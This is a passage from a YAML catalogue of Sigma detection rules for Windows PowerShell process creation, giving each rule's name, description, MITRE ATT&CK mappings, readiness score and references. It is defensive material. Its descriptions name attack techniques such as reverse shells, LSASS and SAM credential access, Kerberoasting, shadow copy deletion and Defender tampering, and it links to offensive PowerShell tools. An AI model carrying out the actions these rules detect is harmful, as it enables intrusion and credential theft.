  - https://github.com/OTRF/detection-hackathon-apt29/issues/16
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: c8a180d6-47a3-4345-a609-53f9c3d834fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_get_localgroup_member_recon.yml
  name: Suspicious Reconnaissance Activity Using Get-LocalGroupMember Cmdlet
  description: Detects suspicious reconnaissance command line activity on Windows
    systems using the PowerShell Get-LocalGroupMember Cmdlet
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.001
  tags:
  - attack.discovery
  - attack.t1087.001
  time_window: ''
  references:
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: b2815d0d-7481-4bf0-9b6c-a4c48a94b349
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_getprocess_lsass.yml
  name: PowerShell Get-Process LSASS
  description: Detects a "Get-Process" cmdlet and it's aliases on lsass process, which
    is in almost all cases a sign of malicious activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.004
  tags:
  - attack.credential-access
  - attack.t1552.004
  time_window: ''
  references:
  - https://web.archive.org/web/20220205033028/https://twitter.com/PythonResponder/status/1385064506049630211
  false_positives:
  - Unknown
  notes: ''
- detection_id: 514e4c3a-c77d-4cde-a00f-046425e2301e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_hide_services_via_set_service.yml
  name: Abuse of Service Permissions to Hide Services Via Set-Service
  description: Detects usage of the "Set-Service" powershell cmdlet to configure a
    new SecurityDescriptor that allows a service to be hidden from other utilities
    such as "sc.exe", "Get-Service"...etc. (Works only in powershell 7)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://twitter.com/Alh4zr3d/status/1580925761996828672
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
  false_positives:
  - Rare intended use of hidden services
  notes: ''
- detection_id: 09576804-7a05-458e-a817-eb718ca91f54
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_iex_patterns.yml
  name: Suspicious PowerShell IEX Execution Patterns
  description: Detects suspicious ways to run Invoke-Execution using IEX alias
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Legitimate scripts that use IEX
  notes: ''
- detection_id: 5f6a601c-2ecb-498b-9c33-660362323afa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_import_cert_susp_locations.yml
  name: Root Certificate Installed From Susp Locations
  description: Adversaries may install a root certificate on a compromised system
    to avoid warnings when connecting to adversary controlled web servers.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/
  - https://learn.microsoft.com/en-us/powershell/module/pki/import-certificate?view=windowsserver2022-ps
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c31364f7-8be6-4b77-8483-dd2b5a7b69a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_import_module_susp_dirs.yml
  name: Import PowerShell Modules From Suspicious Directories - ProcCreation
  description: Detects powershell scripts that import modules from suspicious directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 37651c2a-42cd-4a69-ae0d-22a4349aa04a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_install_unsigned_appx_packages.yml
  name: Unsigned AppX Installation Attempt Using Add-AppxPackage
  description: Detects usage of the "Add-AppxPackage" or it's alias "Add-AppPackage"
    to install unsigned AppX packages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/msix/package/unsigned-package
  - https://twitter.com/WindowsDocs/status/1620078135080325122
  false_positives:
  - Installation of unsigned packages for testing purposes
  notes: ''
- detection_id: 536e2947-3729-478c-9903-745aaffe60d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml
  name: Suspicious PowerShell Invocations - Specific - ProcessCreation
  description: Detects suspicious PowerShell invocation command parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1edff897-9146-48d2-9066-52e8d8f80a2f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_direct_ip.yml
  name: Suspicious Invoke-WebRequest Execution With DirectIP
  description: Detects calls to PowerShell with Invoke-WebRequest cmdlet using direct
    IP access
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml
  name: Suspicious Invoke-WebRequest Execution
  description: Detects a suspicious call to Invoke-WebRequest cmdlet where the and
    output is located in a suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/
  false_positives:
  - Unknown
  notes: ''
- detection_id: caa9a802-8bd8-4b9e-a5cd-4d6221670219
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_kerberos_kerberos_ticket_request_via_cli.yml
  name: Suspicious Kerberos Ticket Request via CLI
  description: 'Detects suspicious Kerberos ticket requests via command line using
    System.IdentityModel.Tokens.KerberosRequestorSecurityToken class.

    Threat actors may use command line interfaces to request Kerberos tickets for
    service accounts in order to

    perform offline password cracking attacks commonly known as Kerberoasting or other
    Kerberos ticket abuse

    techniques like silver ticket attacks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://www.huntress.com/blog/gootloader-threat-detection-woff2-obfuscation
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1558.003/T1558.003.md#atomic-test-4---request-a-single-ticket-via-powershell
  - https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8.1
  false_positives:
  - Legitimate command line usage by administrators or security tools.
  notes: ''
- detection_id: 889719ef-dd62-43df-86c3-768fb08dc7c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_mailboxexport_share.yml
  name: Suspicious PowerShell Mailbox Export to Share
  description: Detects usage of the powerShell New-MailboxExportRequest Cmdlet to
    exports a mailbox to a remote or local share, as used in ProxyShell exploitations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://youtu.be/5mqid-7zp8k?t=2481
  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
  - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
  - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02030f2f-6199-49ec-b258-ea71b07e03dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml
  name: Malicious PowerShell Commandlets - ProcessCreation
  description: Detects Commandlet names from well-known PowerShell exploitation frameworks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 12
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.001
  - T1069
  - T1069.001
  - T1069.002
  - T1087
  - T1087.001
  - T1087.002
  - T1482
  tags:
  - attack.execution
  - attack.discovery
  - attack.t1482
  - attack.t1087
  - attack.t1087.001
  - attack.t1087.002
  - attack.t1069.001
  - attack.t1069.002
  - attack.t1069
  - attack.t1059.001
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries
  - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1
  - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1
  - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1
  - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1
  - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/
  - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/
  - https://github.com/calebstewart/CVE-2021-1675
  - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1
  - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html
  - https://github.com/HarmJ0y/DAMP
  - https://github.com/samratashok/nishang
  - https://github.com/DarkCoderSc/PowerRunAsSystem/
  - https://github.com/besimorhino/powercat
  - https://github.com/Kevin-Robertson/Powermad
  - https://github.com/adrecon/ADRecon
  - https://github.com/adrecon/AzureADRecon
  - https://github.com/sadshade/veeam-creds/blob/6010eaf31ba41011b58d6af3950cffbf6f5cea32/Veeam-Get-Creds.ps1
  - https://github.com/The-Viper-One/Invoke-PowerDPAPI/
  - https://github.com/Arno0x/DNSExfiltrator/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 83809e84-4475-4b69-bc3e-4aad8568612f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_msexchange_transport_agent.yml
  name: MSExchange Transport Agent Installation
  description: Detects the Installation of a Exchange Transport Agent
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.002
  tags:
  - attack.persistence
  - attack.t1505.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=7
  false_positives:
  - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator
    for this.
  notes: ''
- detection_id: f4bbd493-b796-416e-bbf2-121235348529
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_non_interactive_execution.yml
  name: Non Interactive PowerShell Process Spawned
  description: Detects non-interactive PowerShell activity by looking at the "powershell"
    process with a non-user GUI process such as "explorer.exe" as a parent.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://web.archive.org/web/20200925032237/https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html
  false_positives:
  - Likely. Many admin scripts and tools leverage PowerShell in their BAT or VB scripts
    which may trigger this rule often. It is best to add additional filters or use
    this to hunt for anomalies
  notes: ''
- detection_id: e312efd0-35a1-407f-8439-b8d434b438a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_obfuscation_via_utf8.yml
  name: Potential PowerShell Obfuscation Via WCHAR/CHAR
  description: Detects suspicious encoded character syntax often used for defense
    evasion
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1281103918693482496
  false_positives:
  - Unknown
  notes: ''
- detection_id: fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_public_folder.yml
  name: Execution of Powershell Script in Public Folder
  description: This rule detects execution of PowerShell scripts located in the "C:\Users\Public"
    folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.mandiant.com/resources/evolution-of-fin7
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_remotefxvgpudisablement_abuse.yml
  name: RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses
  description: Detects calls to the AtomicTestHarnesses "Invoke-ATHRemoteFXvGPUDisablementCommand"
    which is designed to abuse the "RemoteFXvGPUDisablement.exe" binary to run custom
    PowerShell code via module load-order hijacking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 07e3cb2c-0608-410d-be4b-1511cb1a0448
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_remove_mppreference.yml
  name: Tamper Windows Defender Remove-MpPreference
  description: Detects attempts to remove Windows Defender configurations using the
    'MpPreference' cmdlet
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: edc2f8ae-2412-4dfd-b9d5-0c57727e70be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_reverse_shell_connection.yml
  name: Potential Powershell ReverseShell Connection
  description: Detects usage of the "TcpClient" class. Which can be abused to establish
    remote connections and reverse-shells. As seen used by the Nishang "Invoke-PowerShellTcpOneLine"
    reverse shell and other.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  - https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1
  false_positives:
  - In rare administrative cases, this function might be used to check network connectivity
  notes: ''
- detection_id: 45a594aa-1fbd-4972-a809-ff5a99dd81b8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_run_script_from_ads.yml
  name: Run PowerShell Script from ADS
  description: Detects PowerShell script execution from Alternate Data Stream (ADS)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://github.com/p0shkatz/Get-ADS/blob/1c3a3562e713c254edce1995a7d9879c687c7473/Get-ADS.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: c83bf4b5-cdf0-437c-90fa-43d734f7c476
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_run_script_from_input_stream.yml
  name: Run PowerShell Script from Redirected Input Stream
  description: Detects PowerShell script execution via input stream redirect
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Powershell.yml
  - https://twitter.com/Moriarty_Meng/status/984380793383370752
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1af57a4b-460a-4738-9034-db68b880c665
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_sam_access.yml
  name: PowerShell SAM Copy
  description: Detects suspicious PowerShell scripts accessing SAM hives
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://twitter.com/splinter_code/status/1420546784250769408
  false_positives:
  - Some rare backup scenarios
  - PowerShell scripts fixing HiveNightmare / SeriousSAM ACLs
  notes: ''
- detection_id: 95eadcb2-92e4-4ed1-9031-92547773a6db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_script_engine_parent.yml
  name: Suspicious PowerShell Invocation From Script Engines
  description: Detects suspicious powershell invocations from interpreters or unusual
    programs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.securitynewspaper.com/2017/03/20/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/
  false_positives:
  - Microsoft Operations Manager (MOM)
  - Other scripts
  notes: ''
- detection_id: a95b9b42-1308-4735-a1af-abb1c5e6f5ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_service_dacl_modification_set_service.yml
  name: Suspicious Service DACL Modification Via Set-Service Cmdlet
  description: Detects suspicious DACL modifications via the "Set-Service" cmdlet
    using the "SecurityDescriptorSddl" flag (Only available with PowerShell 7) that
    can be used to hide services or make them unstopable
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.003
  time_window: ''
  references:
  - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
  - https://learn.microsoft.com/pt-br/windows/win32/secauthz/sid-strings
  false_positives:
  - Unknown
  notes: ''
- detection_id: bdeb2cff-af74-4094-8426-724dc937f20a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_set_acl.yml
  name: PowerShell Script Change Permission Via Set-Acl
  description: Detects PowerShell execution to set the ACL of a file or a folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl?view=powershell-5.1
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1505.005/T1505.005.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0944e002-e3f6-4eb5-bf69-3a3067b53d73
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_set_acl_susp_location.yml
  name: PowerShell Set-Acl On Windows Folder
  description: Detects PowerShell scripts to set the ACL to a file in the Windows
    folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl?view=powershell-5.1
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1505.005/T1505.005.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level.yml
  name: Change PowerShell Policies to an Insecure Level
  description: Detects changing the PowerShell script execution policy to a potentially
    insecure level using the "-ExecutionPolicy" flag.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4
  - https://adsecurity.org/?p=2604
  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/
  false_positives:
  - Administrator scripts
  notes: ''
- detection_id: 62b20d44-1546-4e61-afce-8e175eb9473c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_set_service_disabled.yml
  name: Service StartupType Change Via PowerShell Set-Service
  description: Detects the use of the PowerShell "Set-Service" cmdlet to change the
    startup type of a service to "disabled" or "manual"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1562.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955
  false_positives:
  - False positives may occur with troubleshooting scripts
  notes: ''
- detection_id: 21ff4ca9-f13a-41ad-b828-0077b2af2e40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_shadowcopy_deletion.yml
  name: Deletion of Volume Shadow Copies via WMI with PowerShell
  description: Detects deletion of Windows Volume Shadow Copies with PowerShell code
    and Get-WMIObject. This technique is used by numerous ransomware families such
    as Sodinokibi/REvil
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell
